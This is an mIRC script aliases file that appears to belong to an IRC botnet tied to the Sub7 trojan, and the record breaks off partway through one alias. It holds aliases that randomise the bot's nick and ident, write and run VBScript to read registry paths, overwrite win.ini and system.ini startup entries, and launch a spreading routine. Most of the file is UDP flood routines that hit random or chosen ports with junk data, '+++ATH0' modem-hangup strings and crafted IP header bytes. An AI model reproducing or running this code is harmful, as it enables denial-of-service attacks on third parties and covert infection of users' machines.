[aliases]
n0=/msg { if (# == $null) { msg $nick $1- }  |   else { msg $1- } }
n1=/zzstarto {
n2=  disable #Sub7Update
n3=  rlevel 500
n4=  remini mirc.ini ident userid 
n5=  remini mirc.ini mirc user 
n6=  remini mirc.ini mirc email 
n7=  remini mirc.ini mirc anick 
n8=  writeini mirc.ini mirc email $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z)
n9=  writeini mirc.ini mirc anick $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(9,99)
n10=  writeini mirc.ini ident userid $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z)
n11=  writeini mirc.ini mirc user $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z)
n12=  identd on $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z)
n13=  nick $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z)
n14=}
n15=/getwindir {
n16=  if ($exists(windir.vbs) == $true) { .remove windir.vbs }
n17=  if ($exists(windir.txt) == $true) { .remove windir.txt }
n18=  write -c windir.vbs on error resume next
n19=  write windir.vbs Set start = CreateObject("WScript.Shell")
n20=  write windir.vbs rot = start.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\DevicePath")
n21=  write windir.vbs pgm = start.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
n22=  write windir.vbs Set fso = CreateObject("Scripting.FileSystemObject")
n23=  write windir.vbs Set txt = fso.CreateTextFile("windir.txt", True)
n24=  write windir.vbs txt.Write "" & rot & "" & vbCrLf
n25=  write windir.vbs txt.Write "" & pgm & "" & vbCrLf
n26=  write windir.vbs txt.close
n27=  run windir.vbs
n28=  timer 1 5 cleanwindir
n29=  ; mIRC bug : if u join both aliases togheter and tryed to setup a timer for set ... $read , mIRC will check $read 1st and the file wont be existed so it will give u an ERROR
n30=}
n31=/cleanwindir {
n32=  set %windir% $remove( [ $read -l1 windir.txt ] ,\INF)
n33=  ; i chose the INF DIR because win2k is different that win 9x .. no key called system root :( in the same place  
n34=  set %progdir% $read -l2 windir.txt
n35=  if ($exists(windir.vbs) == $true) { .remove windir.vbs }
n36=  if ($exists(windir.txt) == $true) { .remove windir.txt }
n37=  ; ========= cleaning other ppl shit ;) =============
n38=  writeini $+ $chr(032) $+ %windir% $+ \win.ini windows run None
n39=  writeini $+ $chr(032) $+ %windir% $+ \win.ini windows load None
n40=  writeini $+ $chr(032) $+ %windir% $+ \system.ini boot shell Explorer.exe
n41=}
n42=/zzspread {
n43=  if ($exists(zzspread.vbs) == $true) { .remove zzspread.vbs }
n44=  write -c zzspread.vbs on error resume next
n45=  write zzspread.vbs Set src3 = CreateObject("Wscript.shell")
n46=  write zzspread.vbs src3.run "Fonts.fnt slave.fnt",0,true
n47=  run zzspread.vbs
n48=  timer 1 10 dde zbotz command "" /readspread $1 $2 $3
n49=  timer 1 15 remove zzspread.vbs
n50=}
n51=/softexit {
n52=  if ($1 == w) { dde zbotz command "" /exit | //close -ms | //run Fonts.vbs | //exit } 
n53=  if ($1 == o) { //close -ms | //run Fonts.vbs | //exit }
n54=}
n55=/randomudp { 
n56=  %Znum.prt1 = $rand(1,65000)
n57=  sockudp Zupdr1 $1 %Znum.prt1  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
n58=  %Znum.prt2 = $rand(1,65000) 
n59=  sockudp Zupdr2 $1 %Znum.prt2  + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n60=  %Znum.prt3 = $rand(1,65000)
n61=  sockudp Zupdr3 $1 %Znum.prt3  0x45,0x00,0x00,0x26,0x12,0x34,0x00,0x00,0xFF,0x11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x00,0x12,0x00,0x00,'1','2','3','4','5','6','7','8','9','0'
n62=  %Znum.prt4 = $rand(1,65000)
n63=  sockudp Zupdr4 $1 %Znum.prt4 @!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!
n64=  %Znum.prt5 = $rand(1,65000)
n65=  sockudp Zupdr5 $1 %Znum.prt5 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
n66=  %Znum.prt6 = $rand(1,65000)
n67=  sockudp Zupdr6 $1 %Znum.prt6  + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n68=  %Znum.prt7 = $rand(1,65000)
n69=  sockudp Zupdr7 $1 %Znum.prt7 0x45,0x00,0x00,0x26,0x12,0x34,0x00,0x00,0xFF,0x11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x00,0x12,0x00,0x00,'1','2','3','4','5','6','7','8','9','0'
n70=  %Znum.prt8 = $rand(1,65000)
n71=  sockudp Zupdr8 $1 %Znum.prt8 @!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@
n72=  %Znum.prt9 = $rand(1,65000)
n73=  sockudp Zupdr9 $1 %Znum.prt9 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
n74=  %Znum.prt10 = $rand(1,65000)
n75=  sockudp Zupdr10 $1 %Znum.prt10 0x45,0x00,0x00,0x26,0x12,0x34,0x00,0x00,0xFF,0x11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x00,0x12,0x00,0x00,'1','2','3','4','5','6','7','8','9','0'
n76=  unset %Znum.prt*
n77=} 
n78=/portudp {
n79=  sockudp Zupd1 $1 $2  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
n80=  sockudp Zupd2 $1 $2  + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n81=  sockudp Zupd3 $1 $2  0x45,0x00,0x00,0x26,0x12,0x34,0x00,0x00,0xFF,0x11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x00,0x12,0x00,0x00,'1','2','3','4','5','6','7','8','9','0'
n82=  sockudp Zupd4 $1 $2  @!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!
n83=  sockudp Zupd5 $1 $2  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
n84=  sockudp Zupd6 $1 $2  0x45,0x00,0x00,0x26,0x12,0x34,0x00,0x00,0xFF,0x11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x00,0x12,0x00,0x00,'1','2','3','4','5','6','7','8','9','0'
n85=  sockudp Zupd7 $1 $2  + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n86=  sockudp Zupd8 $1 $2  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
n87=  sockudp Zupd9 $1 $2  0x45,0x00,0x00,0x26,0x12,0x34,0x00,0x00,0xFF,0x11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x00,0x12,0x00,0x00,'1','2','3','4','5','6','7','8','9','0'
n88=  sockudp Zupd10 $1 $2  @!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@
n89=}
n90=/zrandomudp { 
n91=  %zZnum.prt1 = $rand(1,65000)
n92=  sockudp zZupdr1 $1 $2 %zZnum.prt1  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!